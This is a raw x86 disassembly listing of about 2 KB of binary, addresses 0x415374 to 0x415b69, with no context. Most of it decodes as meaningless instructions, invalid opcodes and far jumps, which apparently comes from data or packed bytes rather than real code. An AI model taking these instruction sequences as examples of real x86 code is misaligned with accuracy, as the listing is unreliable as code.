  415374:	adc    BYTE PTR [edi+0xf643e4b],bh
  41537a:	gs std 
  41537c:	mov    esp,0x56d67c31
  415381:	imul   edx,DWORD PTR [ebx-0x76],0x8d76b4de
  415388:	fdiv   st(6),st
  41538a:	mov    edx,0x30b813
  41538f:	add    DWORD PTR [ecx],esi
  415391:	cmp    al,BYTE PTR [esi]
  415393:	cmp    al,0xe
  415395:	and    dh,BYTE PTR [edi+0x5709ffcd]
  41539b:	mov    al,0x87
  41539d:	mov    dl,BYTE PTR [edx]
  41539f:	int    0x9
  4153a1:	aam    0x89
  4153a3:	(bad)  
  4153a4:	jno    0x41534f
  4153a6:	push   ss
  4153a7:	mov    al,ds:0x85eceb0e
  4153ac:	jg     0x415338
  4153ae:	stos   BYTE PTR es:[edi],al
  4153af:	pushf  
  4153b0:	push   esi
  4153b1:	inc    eax
  4153b2:	sub    BYTE PTR ds:0x65ba81ba,ch
  4153b8:	cwde   
  4153b9:	mov    ecx,0xf8f0463
  4153be:	inc    esi
  4153bf:	test   eax,0x1e6f45f6
  4153c4:	popa   
  4153c5:	mov    dl,0xb4
  4153c7:	or     edi,esp
  4153c9:	pop    ebx
  4153ca:	sub    edx,DWORD PTR [eax+ecx*2]
  4153cd:	push   eax
  4153ce:	and    DWORD PTR [ebp-0x438f9ce8],0xca1b854a
  4153d8:	or     ebp,DWORD PTR [edi+0x5e]
  4153db:	pop    ebx
  4153dc:	aad    0x89
  4153de:	ss iret 
  4153e0:	jns    0x4153ca
  4153e2:	dec    ecx
  4153e3:	call   0x78c:0x2e8462a8
  4153ea:	cmc    
  4153eb:	dec    esi
  4153ec:	pop    edi
  4153ed:	cmp    BYTE PTR [eax+edx*4],dl
  4153f0:	outs   dx,BYTE PTR ds:[esi]
  4153f1:	lahf   
  4153f2:	push   ebx
  4153f3:	jle    0x4153e9
  4153f5:	cmp    al,0xaf
  4153f7:	das    
  4153f8:	ds mov al,cl
  4153fb:	inc    edx
  4153fc:	mov    eax,0x36d2659d
  415401:	sbb    esi,esi
  415403:	jo     0x41539f
  415405:	xor    eax,0x43a63107
  41540a:	out    0x3b,eax
  41540c:	shl    BYTE PTR [ebp-0x73],0x93
  415410:	arpl   WORD PTR [ecx+0x1f],sp
  415413:	out    dx,al
  415414:	pop    es
  415415:	inc    ebx
  415416:	dec    ebp
  415417:	xchg   ecx,eax
  415418:	das    
  415419:	mov    ebx,0x4045a46d
  41541e:	jmp    0x614:0xf1d6a3d3
  415425:	sbb    dh,dl
  415427:	add    BYTE PTR [ebp+0x65],al
  41542a:	fidiv  WORD PTR [esi]
  41542c:	jmp    0xcba1:0x3cc855fc
  415433:	leave  
  415434:	gs inc ecx
  415436:	push   edi
  415437:	xor    DWORD PTR [ecx-0x14],edi
  41543a:	mov    edx,0xc9438e3d
  41543f:	or     dh,BYTE PTR [esi-0x62e61f2]
  415445:	stos   BYTE PTR es:[edi],al
  415446:	cmp    al,0x87
  415448:	xor    cl,al
  41544a:	mov    ebp,0x5b6d3f0f
  41544f:	or     BYTE PTR [ebx-0xf],ch
  415452:	adc    BYTE PTR ds:0xc24357ca,al
  415458:	adc    al,0x8f
  41545a:	and    ah,al
  41545c:	scas   al,BYTE PTR es:[edi]
  41545d:	fiadd  DWORD PTR [ebx]
  41545f:	push   edx
  415460:	cmp    al,0xeb
  415462:	and    DWORD PTR ss:[eax+esi*4],edx
  415466:	push   eax
  415467:	pushf  
  415468:	(bad)  
  41546a:	or     al,0x65
  41546c:	js     0x4153f6
  41546e:	push   ss
  41546f:	cmp    DWORD PTR [ebp+0x776fc283],edi
  415475:	sbb    dl,al
  415477:	cld    
  415478:	mov    al,0xc3
  41547a:	mov    BYTE PTR [eax-0x2b],bl
  41547d:	jno    0x415466
  41547f:	xor    DWORD PTR [edi*1-0x16f8d22],edx
  415486:	ins    DWORD PTR es:[edi],dx
  415487:	sub    eax,0x1ef55198
  41548c:	dec    edi
  41548d:	jecxz  0x415453
  41548f:	das    
  415490:	and    al,BYTE PTR [esi+eiz*8+0x5ac8c67a]
  415497:	loopne 0x4154e0
  415499:	aad    0xb3
  41549b:	add    eax,0xc7d6c270
  4154a0:	jo     0x4154ef
  4154a2:	hlt    
  4154a3:	hlt    
  4154a4:	pop    esp
  4154a5:	mov    bh,0xa0
  4154a7:	jno    0x415483
  4154a9:	(bad)  
  4154aa:	and    DWORD PTR [edi],edi
  4154ac:	and    al,0x50
  4154ae:	push   0x82897b61
  4154b3:	pop    ebx
  4154b4:	jge    0x4154c9
  4154b6:	xchg   esi,eax
  4154b7:	add    DWORD PTR [ecx+0x16],0x51
  4154bb:	xor    BYTE PTR [ebx+0x62059e22],ch
  4154c1:	mov    edi,0xe2ecab1c
  4154c6:	xchg   esp,eax
  4154c7:	repnz rol al,cl
  4154ca:	sahf   
  4154cb:	dec    ebx
  4154cc:	sbb    DWORD PTR [ebx-0x4f78f07e],ebx
  4154d2:	inc    esp
  4154d3:	xor    DWORD PTR [ebp+0x50a38a1],esi
  4154d9:	sbb    edi,DWORD PTR [eax-0x23]
  4154dc:	into   
  4154dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154de:	dec    edi
  4154df:	mov    cl,0x30
  4154e1:	test   eax,0x48f6ac9
  4154e6:	adc    ah,BYTE PTR es:[edi+ebp*4-0x25]
  4154eb:	xor    DWORD PTR [ebx+0x65],ecx
  4154ee:	nop
  4154ef:	xchg   ebp,eax
  4154f0:	clc    
  4154f1:	call   0x5eef:0xd932d97e
  4154f8:	rol    cl,1
  4154fa:	jp     0x4154fc
  4154fc:	mov    ah,al
  4154fe:	push   eax
  4154ff:	aaa    
  415500:	sub    eax,0xeb7a0334
  415505:	pop    ss
  415506:	cmp    al,0x71
  415508:	mov    bl,0x8
  41550a:	scas   al,BYTE PTR es:[edi]
  41550b:	outs   dx,DWORD PTR ss:[esi]
  41550d:	add    DWORD PTR [ebx],ebx
  41550f:	stos   BYTE PTR es:[edi],al
  415510:	add    DWORD PTR [edx+0x45346860],eax
  415516:	sbb    BYTE PTR [esi-0x2f1159bc],ah
  41551c:	test   BYTE PTR [ecx-0x615beff5],bl
  415522:	xchg   BYTE PTR ds:0x53a2764,bh
  415528:	mov    esi,0xbf97fa60
  41552d:	mov    ebp,0x6548e38a
  415532:	mov    ebx,0x63b21dba
  415537:	aad    0x17
  415539:	sub    ebp,esp
  41553b:	mov    ds:0xaf0feb42,eax
  415540:	cmp    DWORD PTR [edx],0xfffffff6
  415543:	int    0x3
  415545:	pop    esp
  415546:	fmul   DWORD PTR [eax-0x5a]
  415549:	mov    ds:0xdadffaa9,eax
  41554e:	or     al,0x2c
  415550:	push   ds
  415551:	das    
  415552:	aas    
  415553:	js     0x415536
  415555:	repz push ecx
  415557:	js     0x41553b
  415559:	jnp    0x41550d
  41555b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41555c:	outs   dx,BYTE PTR ds:[esi]
  41555d:	jmp    0xf95ec65b
  415562:	pop    ebx
  415563:	add    BYTE PTR [edi-0x4b521974],dl
  415569:	cdq    
  41556a:	dec    DWORD PTR [ecx-0x6d9b4bd1]
  415570:	adc    ah,BYTE PTR [ebp+0x5b]
  415573:	cmp    BYTE PTR [ecx-0x48],cl
  415576:	lods   al,BYTE PTR ds:[esi]
  415577:	add    bh,0xe8
  41557a:	sbb    DWORD PTR [edi-0x6a],esi
  41557d:	fnstenv [ecx+edx*2+0x31d335a4]
  415584:	in     al,dx
  415585:	mov    edx,edi
  415587:	mov    ah,0xe5
  415589:	jl     0x4155fe
  41558b:	mov    ah,cl
  41558d:	pop    DWORD PTR [ebx-0x43]
  415590:	(bad)  [esi+0x378faa66]
  415596:	clc    
  415597:	je     0x415530
  415599:	ror    BYTE PTR [ebp-0x28f4491d],1
  41559f:	lods   al,BYTE PTR ds:[esi]
  4155a0:	push   ecx
  4155a1:	stc    
  4155a2:	dec    edi
  4155a3:	jnp    0x4155ba
  4155a5:	xor    DWORD PTR [ebp-0x80],ebx
  4155a8:	ds mov cl,0x42
  4155ab:	loope  0x415568
  4155ad:	imul   edi,DWORD PTR [ebx],0xffffffe9
  4155b0:	lds    ecx,FWORD PTR [eax]
  4155b2:	ss jo  0x415600
  4155b5:	pusha  
  4155b6:	fdiv   st(7),st
  4155b8:	mov    ds:0x4955b41c,al
  4155bd:	dec    esp
  4155be:	jbe    0x4155b0
  4155c0:	jae    0x415567
  4155c2:	push   ds
  4155c3:	mov    ds:0x8576f088,eax
  4155c8:	jmp    0x9275:0x6f0ecc36
  4155cf:	mov    bl,0x95
  4155d1:	hlt    
  4155d2:	dec    ebx
  4155d3:	mov    al,0x92
  4155d5:	mov    esi,0x737ee98
  4155da:	mov    al,ds:0xa3de11fe
  4155df:	inc    DWORD PTR [edi+0x1e96bd72]
  4155e5:	cmp    eax,0x29308b83
  4155ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155eb:	add    BYTE PTR [ebx],0xc9
  4155ee:	dec    ebp
  4155ef:	inc    ebx
  4155f0:	cmc    
  4155f1:	fs (bad) 
  4155f4:	pop    ds
  4155f5:	aad    0x87
  4155f7:	daa    
  4155f8:	xchg   esi,eax
  4155f9:	rcr    DWORD PTR [esi+0xe],1
  4155fc:	sub    DWORD PTR [esi],esi
  4155fe:	cwde   
  4155ff:	outs   dx,BYTE PTR ds:[esi]
  415600:	fsub   st,st(5)
  415602:	xchg   ecx,eax
  415603:	xchg   edi,eax
  415604:	push   0xffffffca
  415606:	and    eax,0x24dbdd01
  41560b:	fdivr  st,st(6)
  41560d:	mov    dh,0x34
  41560f:	or     eax,0x344b454b
  415614:	fisttp WORD PTR [esi-0x797a514a]
  41561a:	xchg   ecx,eax
  41561b:	loop   0x4155ed
  41561d:	in     al,0x3d
  41561f:	fiadd  WORD PTR [ebp+0x12]
  415622:	cmp    eax,0x597b88dd
  415627:	xor    BYTE PTR [ebp-0xf6ded08],ch
  41562d:	mov    edx,DWORD PTR [edx]
  41562f:	rol    BYTE PTR [esi+eax*2],cl
  415632:	stos   DWORD PTR es:[edi],eax
  415633:	mov    WORD PTR [esi],cs
  415635:	mov    WORD PTR [ecx+0x19],cs
  415638:	push   ds
  415639:	retf   0xf6d2
  41563c:	mov    dh,0x2e
  41563e:	pusha  
  41563f:	mov    esp,es
  415641:	sbb    BYTE PTR [edx+esi*4-0x67],dl
  415645:	jae    0x415609
  415647:	gs xchg esp,eax
  415649:	popf   
  41564a:	icebp  
  41564b:	int3   
  41564c:	retf   0x8a8d
  41564f:	cs jo  0x415625
  415652:	das    
  415653:	hlt    
  415654:	ss xchg ebp,eax
  415656:	xor    DWORD PTR [eax],esi
  415658:	ret    0xcf21
  41565b:	jno    0x4155f3
  41565d:	sbb    BYTE PTR [ebp+0x5a96065b],bh
  415663:	stc    
  415664:	dec    ebp
  415665:	xor    dh,BYTE PTR [edi]
  415667:	inc    edi
  415668:	in     eax,0x7e
  41566a:	xor    dl,BYTE PTR [esi+edx*8-0x79b4305c]
  415671:	or     bh,BYTE PTR ds:0x8a6159ef
  415677:	dec    edi
  415678:	sbb    edx,DWORD PTR [ebp-0x68]
  41567b:	sahf   
  41567c:	hlt    
  41567d:	xchg   edi,eax
  41567e:	sbb    DWORD PTR [esi],edx
  415680:	or     edi,ebp
  415682:	test   dl,bl
  415684:	popf   
  415685:	jo     0x4156ad
  415687:	pushf  
  415688:	sahf   
  415689:	fistp  WORD PTR [edi+ebp*8-0x76]
  41568d:	test   DWORD PTR [esi-0x6b5d0999],eax
  415693:	ins    BYTE PTR es:[edi],dx
  415694:	or     al,0x4d
  415696:	sbb    DWORD PTR [esi+0x156bc6db],0x77
  41569d:	loope  0x4156f8
  41569f:	enter  0x3b77,0x85
  4156a3:	cwde   
  4156a4:	cmp    DWORD PTR [eax+0x515e12ab],edi
  4156aa:	int3   
  4156ab:	lds    edx,FWORD PTR [edi]
  4156ad:	push   ebp
  4156ae:	jl     0x41570d
  4156b0:	sar    DWORD PTR [edx+0x47],1
  4156b3:	xor    eax,DWORD PTR [edx-0x559c20bd]
  4156b9:	sub    al,0x83
  4156bb:	sub    dl,BYTE PTR [edi-0x2d]
  4156be:	imul   edi,esp,0x851cd244
  4156c4:	outs   dx,DWORD PTR ds:[esi]
  4156c5:	jl     0x415712
  4156c7:	xor    bh,BYTE PTR [edi-0x20]
  4156ca:	aam    0x68
  4156cc:	fdivr  DWORD PTR [ebp+0x35]
  4156cf:	mov    gs,WORD PTR [ecx]
  4156d1:	fwait
  4156d2:	or     al,dl
  4156d4:	aad    0x93
  4156d6:	cmp    eax,0xd3e020ce
  4156db:	push   eax
  4156dc:	hlt    
  4156dd:	xor    ch,BYTE PTR [esi]
  4156df:	mov    cl,0xf4
  4156e1:	fcom   DWORD PTR [ebx+0x32]
  4156e4:	cmp    al,0xca
  4156e6:	mov    ebx,0x80538b53
  4156eb:	push   ecx
  4156ec:	mov    BYTE PTR ds:0x40440a7d,dh
  4156f2:	clc    
  4156f3:	xchg   ebp,eax
  4156f4:	and    al,0xd9
  4156f6:	clc    
  4156f7:	mul    DWORD PTR [eax]
  4156f9:	inc    esp
  4156fa:	aam    0x16
  4156fc:	and    BYTE PTR [eax-0x59],al
  4156ff:	lods   eax,DWORD PTR ds:[esi]
  415700:	repz cmp bl,BYTE PTR [ebp+0x5c]
  415704:	jne    0x415712
  415706:	adc    ecx,DWORD PTR [ebx+ebx*1+0x22]
  41570a:	or     al,0xbf
  41570c:	inc    ebp
  41570d:	mov    DWORD PTR ss:[eax-0xf],edx
  415711:	and    BYTE PTR [edx-0x37],0x86
  415715:	fild   WORD PTR ds:0xa1b130bf
  41571b:	push   ss
  41571c:	inc    ebx
  41571d:	icebp  
  41571e:	mov    esi,0x63b3cc67
  415723:	mov    al,0x40
  415725:	pop    ebp
  415726:	into   
  415727:	or     eax,0x17
  41572a:	xchg   ecx,eax
  41572b:	fdivr  QWORD PTR [edx+0x24]
  41572e:	pop    edi
  41572f:	(bad)  
  415730:	out    dx,eax
  415731:	jae    0x4156cb
  415733:	push   ebx
  415734:	bound  esp,QWORD PTR [ecx]
  415736:	jbe    0x41572c
  415738:	adc    eax,0x2740d643
  41573d:	call   0x79f0:0xfc862848
  415744:	and    BYTE PTR [ebx+0x670265dd],0x5e
  41574b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41574c:	mov    ch,0x87
  41574e:	gs hlt 
  415750:	sub    al,BYTE PTR [ebp-0x5484b6e1]
  415756:	in     al,0xfd
  415758:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415759:	mov    ch,0x4
  41575b:	test   DWORD PTR [ebx+0x6a3c0bfb],edi
  415761:	mov    edi,0xfe5529ff
  415766:	dec    eax
  415767:	dec    edx
  415768:	xchg   cl,al
  41576a:	push   0x2938c794
  41576f:	push   0x79b60ff8
  415774:	xchg   ebx,eax
  415775:	pop    edx
  415776:	dec    esp
  415777:	adc    DWORD PTR [ecx],edx
  415779:	add    ecx,esi
  41577b:	in     eax,dx
  41577c:	loop   0x4157f1
  41577e:	fcmovnu st,st(1)
  415780:	ins    BYTE PTR es:[edi],dx
  415781:	mov    bh,0x83
  415783:	dec    edi
  415784:	cmp    al,0x87
  415786:	or     ebx,DWORD PTR [eax]
  415788:	jo     0x4157f1
  41578a:	xor    BYTE PTR [eax],0xe0
  41578d:	loop   0x415773
  41578f:	ret    
  415790:	mov    ds:0x5eabca9,eax
  415795:	cdq    
  415796:	push   ds
  415797:	ret    0xd394
  41579a:	and    al,0x2f
  41579c:	sub    dh,dh
  41579e:	mov    WORD PTR ds:0x4c6930c9,?
  4157a4:	mov    ebp,0x1021c0cd
  4157a9:	dec    esi
  4157aa:	fldenv [bx+si-0x1fff]
  4157af:	mov    al,0x7f
  4157b1:	inc    ebx
  4157b2:	(bad)  
  4157b3:	sbb    edx,DWORD PTR [edi+ecx*8+0x2e]
  4157b7:	pop    eax
  4157b8:	test   al,0xb8
  4157ba:	dec    ebx
  4157bb:	jge    0x415751
  4157bd:	pop    ebx
  4157bf:	cld    
  4157c0:	push   ds
  4157c1:	inc    esi
  4157c2:	nop
  4157c3:	test   eax,0xa97ebefa
  4157c8:	xor    al,0x94
  4157ca:	push   esp
  4157cb:	ret    0x6aec
  4157ce:	push   ss
  4157cf:	rcr    esp,1
  4157d1:	ins    BYTE PTR es:[edi],dx
  4157d2:	add    edx,DWORD PTR [ecx+0x2e]
  4157d5:	and    esp,DWORD PTR [ecx+0x1f]
  4157d8:	pusha  
  4157d9:	cdq    
  4157da:	add    esi,DWORD PTR [ecx]
  4157dc:	dec    ebp
  4157dd:	ficomp WORD PTR [ebp-0x5130d094]
  4157e3:	cs jo  0x415769
  4157e6:	in     al,0x68
  4157e8:	das    
  4157e9:	sub    DWORD PTR [esi+0x2b],esp
  4157ec:	add    al,0xbe
  4157ee:	cmp    edi,DWORD PTR [edi-0x21]
  4157f1:	in     al,dx
  4157f2:	sub    al,0x50
  4157f4:	inc    edi
  4157f5:	sbb    edx,esp
  4157f7:	inc    esp
  4157f8:	xor    al,BYTE PTR cs:[eax]
  4157fb:	cmp    dh,bh
  4157fd:	xor    edx,0xba699573
  415803:	shrd   edx,edi,0x2
  415807:	shr    edi,0x2
  41580a:	or     edi,DWORD PTR [ebp+0x14]
  41580d:	xor    ecx,ecx
  41580f:	or     edx,ecx
  415811:	mov    ecx,DWORD PTR [ebx]
  415813:	mov    DWORD PTR [ebp-0x64],edi
  415816:	mov    edi,DWORD PTR [ebx+0x4]
  415819:	mov    edi,ecx
  41581b:	xor    ecx,ecx
  41581d:	shl    edi,0x1e
  415820:	jmp    0x415daa
  415825:	scas   al,BYTE PTR es:[edi]
  415826:	rcr    BYTE PTR ds:[ebx+0x20],0x59
  41582b:	and    al,0x32
  41582d:	ja     0x41587c
  41582f:	lods   al,BYTE PTR ds:[esi]
  415830:	scas   al,BYTE PTR es:[edi]
  415831:	int3   
  415832:	lock mov ah,0x72
  415835:	stc    
  415836:	mov    ebp,0x43d160c
  41583b:	push   ss
  41583c:	push   ss
  41583d:	(bad)  [esi+0x6b]
  415840:	fcomp  QWORD PTR [ecx]
  415842:	push   0x2a
  415844:	jle    0x4158b6
  415846:	or     bl,dh
  415848:	mov    ds:0xb17806da,al
  41584d:	mov    DWORD PTR [eax+0x2c0340b4],ebp
  415853:	mov    edx,0x2a902866
  415858:	mov    cl,0x90
  41585a:	sahf   
  41585b:	xchg   edi,eax
  41585c:	lea    ebp,[edx+0x1ae34a6a]
  415862:	into   
  415863:	mov    esi,0x331dc5f6
  415868:	xor    eax,0x24091c1e
  41586d:	imul   edx,DWORD PTR [ebp+edi*2+0x547bf0b3],0x7493f380
  415878:	xchg   edi,eax
  415879:	scas   eax,DWORD PTR es:[edi]
  41587a:	dec    edi
  41587b:	add    al,0x58
  41587d:	jnp    0x41583e
  41587f:	leave  
  415880:	sbb    edi,DWORD PTR ds:0xeda7c82b
  415886:	sahf   
  415887:	add    al,0xe4
  415889:	xor    eax,0x2c477d05
  41588e:	aaa    
  41588f:	xchg   ecx,eax
  415890:	mov    esi,0x5f7180e2
  415895:	cmp    BYTE PTR [ecx-0x7e],ch
  415898:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415899:	sti    
  41589a:	sbb    cl,al
  41589c:	fs gs mov ecx,ecx
  4158a0:	sbb    BYTE PTR [edi+0x16840d03],bl
  4158a6:	sbb    eax,0x46c1706d
  4158ab:	les    ecx,FWORD PTR [eax+eax*4-0x11fbab16]
  4158b2:	mov    BYTE PTR [eax+0x6837b795],cl
  4158b8:	fwait
  4158b9:	mov    edi,0xdd5685b9
  4158be:	adc    ah,bh
  4158c0:	mov    eax,ds:0x3a5f9639
  4158c5:	popa   
  4158c6:	fist   DWORD PTR [edx-0x77]
  4158c9:	add    ah,al
  4158cb:	dec    eax
  4158cc:	xlat   BYTE PTR ds:[ebx]
  4158cd:	jmp    0x4158c1
  4158cf:	dec    ecx
  4158d0:	mov    DWORD PTR [edx+eiz*8-0x37],esi
  4158d4:	mov    bl,0x2a
  4158d6:	inc    ecx
  4158d7:	call   FWORD PTR [eax-0x23]
  4158da:	sti    
  4158db:	out    0x41,al
  4158dd:	cdq    
  4158de:	mov    DWORD PTR [esi],ecx
  4158e0:	mov    ds:0x20338715,al
  4158e5:	mov    al,ds:0x48ae555f
  4158ea:	xchg   DWORD PTR [esi+0x4b],ebx
  4158ed:	fs pop ds
  4158ef:	fidivr WORD PTR ds:0xef7d3efa
  4158f5:	into   
  4158f6:	pop    es
  4158f7:	retf   
  4158f8:	out    dx,al
  4158f9:	iret   
  4158fa:	outs   dx,DWORD PTR ds:[esi]
  4158fb:	pop    edx
  4158fc:	lods   eax,DWORD PTR ds:[esi]
  4158fd:	mov    ds:0x5a18847,eax
  415902:	fadd   DWORD PTR [edx+0x7a08d573]
  415908:	jmp    0x415949
  41590a:	xor    esi,0xffffffcc
  41590d:	mov    edi,0x9b2228e4
  415912:	push   esi
  415913:	mov    DWORD PTR [esi+edx*1+0x5d],eax
  415917:	mov    ebx,0x98f4ee89
  41591c:	cmc    
  41591d:	pop    edi
  41591e:	int3   
  41591f:	mov    ch,0xb9
  415921:	(bad)  
  415922:	mov    DWORD PTR [ebx-0x2ee9acdd],edx
  415928:	repz ds mov edi,0x10f89323
  41592f:	setp   BYTE PTR [ebx]
  415932:	pop    ecx
  415933:	(bad)  
  415934:	fwait
  415935:	mov    dh,0x85
  415937:	push   esp
  415938:	mov    dl,0x15
  41593a:	cld    
  41593b:	mov    eax,0x894d1917
  415940:	addr16 fcmovb st,st(6)
  415943:	push   ebx
  415944:	cmp    edi,DWORD PTR [edx]
  415946:	pop    ds
  415947:	sbb    eax,0xc9c243ed
  41594c:	push   eax
  41594d:	add    ecx,DWORD PTR ss:[edx-0x70]
  415951:	jmp    0x415931
  415953:	pop    ecx
  415954:	sbb    ecx,DWORD PTR [ecx]
  415956:	add    BYTE PTR [ebx+0x47],bl
  415959:	push   0xde0cc4eb
  41595e:	test   BYTE PTR [ebx+0x3b],0xc6
  415962:	cld    
  415963:	fcomp  DWORD PTR ds:0x8673a180
  415969:	cdq    
  41596a:	mov    ah,0x5e
  41596c:	mov    ebp,0x29f1a448
  415971:	xor    DWORD PTR [ecx-0x3a79b628],edx
  415977:	pop    ds
  415978:	pop    ebp
  415979:	fwait
  41597a:	xchg   DWORD PTR ds:0x824fb870,eax
  415980:	rcr    edi,1
  415982:	sub    eax,0xf401c38f
  415987:	mov    cl,BYTE PTR [esi+esi*8]
  41598a:	in     al,0xcc
  41598c:	daa    
  41598d:	jne    0x415983
  41598f:	push   edi
  415990:	cmp    eax,0xb82682ab
  415995:	aas    
  415996:	push   ebp
  415997:	out    dx,al
  415998:	addr16 mov edx,0xabc8aca5
  41599f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159a0:	inc    ecx
  4159a1:	jg     0x415a05
  4159a3:	push   0x2983c02a
  4159a8:	into   
  4159a9:	retf   
  4159aa:	neg    DWORD PTR [eax]
  4159ac:	inc    esp
  4159ad:	fnstsw WORD PTR [esi+0x33]
  4159b0:	cli    
  4159b1:	jbe    0x415966
  4159b3:	xchg   ecx,eax
  4159b4:	daa    
  4159b5:	out    0x36,al
  4159b7:	aas    
  4159b8:	loope  0x4159a1
  4159ba:	repz and eax,0xed88c6eb
  4159c0:	dec    edi
  4159c1:	dec    eax
  4159c2:	mov    bh,0x8
  4159c4:	cli    
  4159c5:	jno    0x4159d6
  4159c7:	and    DWORD PTR [ebx-0x6c],edx
  4159ca:	jns    0x415a44
  4159cc:	sbb    al,0xef
  4159ce:	add    eax,0x22689277
  4159d3:	sbb    al,BYTE PTR [edx+0x26]
  4159d6:	nop
  4159d7:	mov    ah,0x5f
  4159d9:	ins    DWORD PTR es:[edi],dx
  4159da:	hlt    
  4159db:	and    DWORD PTR [ecx+eiz*1+0x36],eax
  4159df:	dec    ebx
  4159e0:	mov    ebp,0xbc693618
  4159e5:	repz dec ecx
  4159e7:	pop    edx
  4159e8:	mov    ebx,0xea344752
  4159ed:	or     eax,0xdc60c6b1
  4159f2:	xchg   ebx,eax
  4159f3:	push   cs
  4159f4:	bound  eax,QWORD PTR ss:[eax-0x557d2459]
  4159fb:	loopne 0x4159a9
  4159fd:	pop    ebx
  4159fe:	je     0x415a60
  415a00:	mov    ?,WORD PTR [eax]
  415a02:	mov    cl,0x24
  415a04:	jl     0x4159b4
  415a06:	cs or  eax,0x4509d018
  415a0c:	loop   0x4159fe
  415a0e:	(bad)  
  415a10:	push   0x18
  415a12:	arpl   WORD PTR [edi-0x58d7b7ec],di
  415a18:	mov    ch,0x14
  415a1a:	es mov dh,0x2c
  415a1d:	popa   
  415a1e:	adc    DWORD PTR [edx-0x578a1afa],edx
  415a24:	mov    al,0x49
  415a26:	inc    ebx
  415a28:	jae    0x4159e0
  415a2a:	aas    
  415a2b:	push   0x3b
  415a2d:	pop    ds
  415a2e:	mov    al,0x67
  415a30:	int3   
  415a31:	add    esp,DWORD PTR [edi-0x49]
  415a34:	cmc    
  415a35:	or     eax,0x5a75f0d5
  415a3a:	sbb    esi,esp
  415a3c:	lods   al,BYTE PTR ds:[esi]
  415a3d:	xchg   BYTE PTR [ebp-0x19a542ff],cl
  415a43:	dec    esi
  415a44:	ins    BYTE PTR es:[edi],dx
  415a45:	enter  0x3893,0x20
  415a49:	test   ebp,edi
  415a4b:	jo     0x415a2a
  415a4d:	dec    esp
  415a4e:	imul   BYTE PTR [edx+ecx*2-0x15]
  415a52:	adc    DWORD PTR [esi-0x19],esp
  415a55:	pop    ss
  415a56:	or     BYTE PTR [ebx],bh
  415a58:	jl     0x415aa5
  415a5a:	call   0x3766e7ef
  415a5f:	inc    ebx
  415a60:	xor    bh,BYTE PTR [eax]
  415a62:	in     al,0xab
  415a64:	out    dx,al
  415a65:	fsubr  st,st(2)
  415a67:	js     0x415a15
  415a69:	in     eax,0xe7
  415a6b:	pushf  
  415a6c:	xor    eax,0x35271983
  415a71:	stos   DWORD PTR es:[edi],eax
  415a72:	lock fiadd WORD PTR [esp+edi*1+0x404b25d7]
  415a7a:	jbe    0x415a40
  415a7c:	loopne 0x415add
  415a7e:	pushf  
  415a7f:	push   edx
  415a80:	mov    dl,0x8c
  415a82:	xchg   edi,eax
  415a83:	dec    esp
  415a84:	xchg   edi,eax
  415a85:	xor    bl,BYTE PTR [ecx+0x75d2de8e]
  415a8b:	sbb    ebx,ecx
  415a8d:	pusha  
  415a8e:	in     al,0xf9
  415a90:	push   ss
  415a91:	cmp    esi,esp
  415a93:	jns    0x415a59
  415a95:	bound  esi,QWORD PTR [eax+esi*1+0x70588c79]
  415a9c:	(bad)  
  415a9d:	out    0x1,eax
  415a9f:	pop    es
  415aa0:	ds mov edi,0x80356593
  415aa6:	adc    cl,ch
  415aa8:	arpl   WORD PTR [esi],sp
  415aaa:	dec    eax
  415aab:	fistp  WORD PTR ds:0xde46b430
  415ab1:	pushf  
  415ab2:	pop    ebx
  415ab3:	mov    bl,0xc4
  415ab5:	push   0xffffffa0
  415ab7:	rol    dh,1
  415ab9:	enter  0x5156,0x12
  415abd:	aaa    
  415abe:	int3   
  415abf:	scas   eax,DWORD PTR es:[edi]
  415ac0:	cmp    al,0xb9
  415ac2:	xchg   ebp,eax
  415ac3:	popf   
  415ac4:	data16 (bad) 
  415ac6:	gs jns 0x415a6e
  415ac9:	mov    edx,0x56b36cf0
  415ace:	inc    esp
  415acf:	or     BYTE PTR [esi-0x6e9143df],cl
  415ad5:	add    dh,ch
  415ad7:	dec    edx
  415ad8:	xor    DWORD PTR [esi+0x23],ebp
  415adb:	dec    esi
  415adc:	imul   ebx,eax,0xffffffa6
  415adf:	sub    al,0x54
  415ae1:	(bad)  
  415ae3:	jo     0x415af6
  415ae5:	xor    DWORD PTR [eax-0x78cb3e34],ebx
  415aeb:	sbb    eax,0x9ac5bc86
  415af0:	push   edx
  415af1:	loop   0x415b55
  415af3:	mov    ebp,0x9594f1df
  415af8:	adc    BYTE PTR [ecx+0x555f5b2f],0xd7
  415aff:	or     eax,DWORD PTR [esi-0x1]
  415b02:	xor    esi,eax
  415b04:	nop
  415b05:	or     al,0xd4
  415b07:	pop    ds
  415b08:	and    ebp,edi
  415b0a:	push   ecx
  415b0b:	jns    0x415b14
  415b0d:	repz fwait
  415b0f:	jne    0x415b54
  415b11:	inc    ebx
  415b12:	mov    edx,0xf097290b
  415b17:	dec    ecx
  415b18:	int    0x29
  415b1a:	cmp    cl,BYTE PTR [esi-0x5]
  415b1d:	stos   DWORD PTR es:[edi],eax
  415b1e:	pop    esp
  415b1f:	mov    dl,0xe1
  415b21:	jbe    0x415b0b
  415b23:	ds pop es
  415b25:	neg    BYTE PTR [esi+0x58]
  415b28:	add    eax,0xf557e3ff
  415b2d:	(bad)  
  415b2e:	jno    0x415b15
  415b30:	cmp    bl,al
  415b32:	jmp    0x571aae76
  415b37:	mov    ds,WORD PTR [edx+eax*2+0x1893e431]
  415b3e:	add    DWORD PTR [ecx],ebp
  415b40:	int3   
  415b41:	push   0x984d3745
  415b46:	xlat   BYTE PTR ds:[ebx]
  415b47:	inc    ecx
  415b48:	mov    bl,0x6f
  415b4a:	xor    BYTE PTR [ebx],0xff
  415b4d:	jae    0x415b70
  415b4f:	xlat   BYTE PTR ds:[ebx]
  415b50:	lods   eax,DWORD PTR ds:[esi]
  415b51:	int    0x5e
  415b53:	dec    edi
  415b54:	data16 ins BYTE PTR es:[edi],dx
  415b56:	bsf    ebx,edi
  415b59:	mov    ebp,0x603f3a36
  415b5e:	jecxz  0x415b8b
  415b60:	fisttp DWORD PTR [ebx-0x4606988]
  415b66:	lock iret 
  415b68:	ret    
  415b69:	ror    al,cl
